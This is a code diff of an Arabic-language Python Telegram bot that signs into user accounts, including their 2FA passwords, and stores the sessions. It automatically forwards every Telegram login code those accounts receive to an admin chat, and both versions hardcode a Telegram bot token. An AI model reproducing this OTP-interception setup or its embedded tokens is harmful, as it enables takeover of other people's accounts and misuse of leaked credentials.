@@ -1,14 +1,6 @@
 import sys
 import os
 import asyncio
-
-# 1. إعداد الـ Event Loop قبل أي استدعاء لمكتبة Pyrogram لمنع الانهيار في Render
-try:
-    asyncio.get_event_loop()
-except RuntimeError:
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-
 import re
 import glob
 import logging
@@ -39,42 +31,57 @@ def run_flask():
 # ══════════════════ الإعدادات ══════════════════
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8893399262:AAG07XosgkW6YRaTanBpwFuJF9ozJj82x0M")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8893399262:AAGQXKaZI-na_mTAoO4RKqwlDoQ6h3f89h0")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", 8619521184))
 
 user_states = {}
 temp_data = {}
 active_userbots = {}  # phone -> Client
+ptb_app = None  # reference to telegram app
 
 # ══════════════════ التقاط الرموز بشكل أقوى ══════════════════
-def attach_otp_handler(userbot_client: Client, phone_num: str, ptb_app):
-    @userbot_client.on_message()
+def attach_otp_handler(userbot_client: Client, phone_num: str):
+    """ربط معالج لالتقاط رموز الدخول"""
+    
+    @userbot_client.on_message(filters.user(777000) | filters.service)
     async def auto_forward_otp(client, message):
         try:
-            is_telegram = (message.from_user and message.from_user.id == 777000)
+            # التأكد من وجود نص في الرسالة
             msg_text = message.text or message.caption or ""
-
-            # شروط قراءة الرسائل وتوجيه الأكواد
-            if is_telegram or any(x in msg_text.lower() for x in ["login code", "رمز الدخول", "code:", "كود"]) or re.search(r'\b\d{5}\b', msg_text):
-                text = f"🚨 **رمز جديد للحساب (`+{phone_num}`):**\n\n`{msg_text}`"
-                await ptb_app.bot.send_message(
-                    chat_id=ADMIN_ID,
-                    text=text,
-                    parse_mode=ParseMode.MARKDOWN
-                )
+            
+            # طباعة للتصحيح
+            logging.info(f"📩 رسالة جديدة من 777000: {msg_text[:100]}")
+            
+            # التحقق من وجود رمز
+            if msg_text:
+                # البحث عن أرقام (رموز)
+                codes = re.findall(r'\b\d{5,6}\b', msg_text)
+                
+                # إذا كان هناك رمز أو كان النص يحتوي على كلمات مفتاحية
+                if codes or any(x in msg_text.lower() for x in ["login code", "رمز الدخول", "code:", "كود"]):
+                    # إرسال الرمز للأدمن
+                    await ptb_app.bot.send_message(
+                        chat_id=ADMIN_ID,
+                        text=f"🔐 **رمز دخول جديد للحساب `+{phone_num}`**\n\n"
+                             f"```\n{msg_text}\n```\n\n"
+                             f"📌 الرمز المستخرج: `{codes[0] if codes else 'غير واضح'}`",
+                        parse_mode=ParseMode.MARKDOWN
+                    )
+                    logging.info(f"✅ تم إرسال رمز للحساب +{phone_num}")
+                    
         except Exception as e:
             logging.error(f"خطأ في إرسال الرمز: {e}")
 
-# ══════════════════ لوحة التحكم (متوافقة) ══════════════════
+# ══════════════════ لوحة التحكم ══════════════════
 def admin_menu_kb():
     keyboard = [
         [
-            InlineKeyboardButton("🟢 ➕ إضافة جلسة", callback_data="add_session"),
-            InlineKeyboardButton("🔵 📱 الجلسات النشطة", callback_data="list_sessions")
+            InlineKeyboardButton("➕ إضافة جلسة", callback_data="add_session"),
+            InlineKeyboardButton("📱 الجلسات النشطة", callback_data="list_sessions")
         ],
         [
             InlineKeyboardButton("📩 طلب رمز", callback_data="request_code"),
-            InlineKeyboardButton("🔴 🗑 حذف جلسة", callback_data="delete_session")
+            InlineKeyboardButton("🗑 حذف جلسة", callback_data="delete_session")
         ]
     ]
     return InlineKeyboardMarkup(keyboard)
@@ -99,18 +106,28 @@ def delete_sessions_kb():
 
 # ══════════════════ الأوامر ══════════════════
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global ptb_app
+    ptb_app = context.application
+    
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("⛔ هذا البوت مخصص للأدمن فقط.")
         return
 
     await update.message.reply_text(
         "👋 **أهلاً بك في لوحة إدارة جلسات تيليجرام**\n\n"
-        "يمكنك إضافة جلساتك الخاصة واستقبال رموز الدخول مباشرة هنا.",
+        "📌 **المميزات:**\n"
+        "• إضافة حسابات وحفظ الجلسات\n"
+        "• استقبال رموز الدخول تلقائياً\n"
+        "• طلب رموز جديدة يدوياً\n\n"
+        "اختر الخيار المناسب:",
         reply_markup=admin_menu_kb(),
         parse_mode=ParseMode.MARKDOWN
     )
 
 async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global ptb_app
+    ptb_app = context.application
+    
     query = update.callback_query
     uid = query.from_user.id
 
@@ -133,7 +150,8 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states[ADMIN_ID] = "WAIT_API_ID"
         await query.edit_message_text(
             "📝 **الخطوة 1:** أرسل الآن الـ **API ID**\n"
-            "(من موقع my.telegram.org)"
+            "(من موقع my.telegram.org)\n\n"
+            "📌 مثال: `12345678`"
         )
 
     elif data == "list_sessions":
@@ -142,7 +160,12 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             text = f"📱 **الجلسات النشطة ({len(active_userbots)}):**\n\n"
             for phone in active_userbots:
-                text += f"• `+{phone}` 🟢\n"
+                try:
+                    me = await active_userbots[phone].get_me()
+                    username = f"@{me.username}" if me.username else "بدون يوزر"
+                    text += f"• `+{phone}` 🟢 {username}\n"
+                except:
+                    text += f"• `+{phone}` 🔴 غير متصل\n"
         await query.edit_message_text(text, reply_markup=admin_menu_kb(), parse_mode=ParseMode.MARKDOWN)
 
     elif data == "request_code":
@@ -150,7 +173,7 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text("⚠️ لا توجد جلسات مضافة.", reply_markup=admin_menu_kb())
             return
         await query.edit_message_text(
-            "📩 **اختر الحساب الذي تريد طلب رمز له:**",
+            "📩 **اختر الحساب لطلب رمز جديد:**",
             reply_markup=sessions_kb()
         )
 
@@ -161,10 +184,12 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer("الجلسة غير موجودة", show_alert=True)
             return
         try:
+            # طلب رمز جديد
             await client.send_code(phone)
             await query.edit_message_text(
-                f"✅ تم طلب الرمز للحساب `+{phone}`\n"
-                "سيوصلك الرمز هنا تلقائياً فور صدوره.",
+                f"✅ **تم طلب الرمز للحساب `+{phone}`**\n\n"
+                "📩 ستصلك رسالة تحتوي على الرمز في تطبيق تلغرام.\n"
+                "🔄 سيتم إرسال الرمز لك هنا تلقائياً.",
                 reply_markup=admin_menu_kb(),
                 parse_mode=ParseMode.MARKDOWN
             )
@@ -180,7 +205,7 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text("⚠️ لا توجد جلسات لحذفها.", reply_markup=admin_menu_kb())
             return
         await query.edit_message_text(
-            "🗑 **اختر الجلسة التي تريد حذفها:**",
+            "🗑 **اختر الجلسة للحذف:**",
             reply_markup=delete_sessions_kb()
         )
 
@@ -196,7 +221,7 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if os.path.exists(session_file):
                 os.remove(session_file)
             await query.edit_message_text(
-                f"✅ تم حذف الجلسة `+{phone}`",
+                f"✅ **تم حذف الجلسة `+{phone}` بنجاح**",
                 reply_markup=admin_menu_kb(),
                 parse_mode=ParseMode.MARKDOWN
             )
@@ -204,6 +229,9 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer("الجلسة غير موجودة", show_alert=True)
 
 async def handle_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global ptb_app
+    ptb_app = context.application
+    
     if update.effective_user.id != ADMIN_ID:
         return
 
@@ -216,12 +244,18 @@ async def handle_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         temp_data[ADMIN_ID] = {"api_id": int(text)}
         user_states[ADMIN_ID] = "WAIT_API_HASH"
-        await update.message.reply_text("📝 **الخطوة 2:** أرسل الآن الـ **API HASH**:")
+        await update.message.reply_text(
+            "📝 **الخطوة 2:** أرسل الآن الـ **API HASH**\n"
+            "(من موقع my.telegram.org)"
+        )
 
     elif state == "WAIT_API_HASH":
         temp_data[ADMIN_ID]["api_hash"] = text
         user_states[ADMIN_ID] = "WAIT_PHONE"
-        await update.message.reply_text("📱 **الخطوة 3:** أرسل رقم الهاتف مع رمز الدولة (مثال: `213xxxxxxxxx`):")
+        await update.message.reply_text(
+            "📱 **الخطوة 3:** أرسل رقم الهاتف مع رمز الدولة\n"
+            "📌 مثال: `213xxxxxxxxx`"
+        )
 
     elif state == "WAIT_PHONE":
         phone = text.replace("+", "").replace(" ", "")
@@ -239,45 +273,69 @@ async def handle_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE):
             temp_data[ADMIN_ID]["client"] = client
             temp_data[ADMIN_ID]["phone_code_hash"] = sent.phone_code_hash
             user_states[ADMIN_ID] = "WAIT_CODE"
-            await update.message.reply_text("📩 وصلك كود التحقق، أرسله هنا:")
+            await update.message.reply_text(
+                "📩 **تم إرسال الكود!**\n\n"
+                "افتح تطبيق تلغرام وانسخ الكود ثم أرسله هنا:"
+            )
         except Exception as e:
             await client.disconnect()
             user_states.pop(ADMIN_ID, None)
+            temp_data.pop(ADMIN_ID, None)
             await update.message.reply_text(f"❌ خطأ: `{e}`", reply_markup=admin_menu_kb())
 
     elif state == "WAIT_CODE":
         code = text
         data = temp_data.get(ADMIN_ID)
+        if not data:
+            await update.message.reply_text("⚠️ انتهت الجلسة، أعد المحاولة.")
+            return
+            
         client = data["client"]
 
         try:
             await client.sign_in(data["phone"], data["phone_code_hash"], code)
-            attach_otp_handler(client, data["phone"], context.application)
+            
+            # ربط معالج الرموز
+            attach_otp_handler(client, data["phone"])
             active_userbots[data["phone"]] = client
 
             user_states.pop(ADMIN_ID, None)
             temp_data.pop(ADMIN_ID, None)
 
             await update.message.reply_text(
-                f"✅ **تم ربط الجلسة بنجاح للحساب `+{data['phone']}`**\n"
-                "الآن أي رمز يوصل لهذا الحساب راح يجيلك هنا مباشرة.",
+                f"✅ **تم ربط الجلسة بنجاح للحساب `+{data['phone']}`**\n\n"
+                "🔐 الآن أي رمز دخول يصل لهذا الحساب سيتم إرساله لك هنا تلقائياً.",
                 reply_markup=admin_menu_kb(),
                 parse_mode=ParseMode.MARKDOWN
             )
         except SessionPasswordNeeded:
             user_states[ADMIN_ID] = "WAIT_2FA"
-            await update.message.reply_text("🔐 الحساب محمي بـ 2FA. أرسل كلمة السر:")
+            await update.message.reply_text(
+                "🔐 **مطلوب التحقق بخطوتين (2FA)**\n\n"
+                "أدخل كلمة السر الخاصة بحسابك:"
+            )
         except (PhoneCodeInvalid, PhoneCodeExpired):
-            await update.message.reply_text("❌ الرمز غير صحيح أو منتهي.")
+            await update.message.reply_text(
+                "❌ **الرمز غير صحيح أو منتهي!**\n"
+                "أعد إرسال الكود الصحيح:"
+            )
+        except Exception as e:
+            await update.message.reply_text(f"❌ خطأ غير متوقع: `{e}`")
 
     elif state == "WAIT_2FA":
         password = text
         data = temp_data.get(ADMIN_ID)
+        if not data:
+            await update.message.reply_text("⚠️ انتهت الجلسة، أعد المحاولة.")
+            return
+            
         client = data["client"]
 
         try:
             await client.check_password(password)
-            attach_otp_handler(client, data["phone"], context.application)
+            
+            # ربط معالج الرموز
+            attach_otp_handler(client, data["phone"])
             active_userbots[data["phone"]] = client
 
             user_states.pop(ADMIN_ID, None)
@@ -289,37 +347,54 @@ async def handle_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode=ParseMode.MARKDOWN
             )
         except Exception as e:
-            await update.message.reply_text(f"❌ كلمة السر خطأ: `{e}`")
+            await update.message.reply_text(f"❌ كلمة السر غير صحيحة: `{e}`")
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     logging.error("Exception while handling an update:", exc_info=context.error)
 
-async def load_existing_sessions(ptb_app):
+async def load_existing_sessions():
+    """تحميل الجلسات المحفوظة"""
+    global active_userbots
+    
     for file in glob.glob("session_*.session"):
         phone = file.replace("session_", "").replace(".session", "")
         try:
+            # محاولة تحميل الجلسة
             client = Client(f"session_{phone}")
             await client.start()
-            attach_otp_handler(client, phone, ptb_app)
+            
+            # ربط معالج الرموز
+            attach_otp_handler(client, phone)
             active_userbots[phone] = client
-            print(f"✅ تم تحميل الجلسة: +{phone}")
+            logging.info(f"✅ تم تحميل الجلسة: +{phone}")
         except Exception as e:
-            print(f"❌ فشل تحميل {phone}: {e}")
+            logging.error(f"❌ فشل تحميل {phone}: {e}")
 
 async def post_init(app: Application):
-    await load_existing_sessions(app)
+    """تشغيل بعد بدء البوت"""
+    global ptb_app
+    ptb_app = app
+    logging.info("🔄 جاري تحميل الجلسات المحفوظة...")
+    await load_existing_sessions()
+    logging.info(f"✅ تم تحميل {len(active_userbots)} جلسة")
 
 def main():
+    global ptb_app
+    
+    # تشغيل خادم Flask
     Thread(target=run_flask, daemon=True).start()
 
+    # إنشاء تطبيق البوت
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
+    ptb_app = app
 
+    # إضافة المعالجات
     app.add_error_handler(error_handler)
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CallbackQueryHandler(on_callback))
     app.add_handler(MessageHandler(PTBFilters.TEXT & ~PTBFilters.COMMAND, handle_inputs))
 
-    print("🚀 البوت يعمل...")
+    logging.info("🚀 البوت يعمل...")
     app.run_polling()
 
 if __name__ == "__main__":
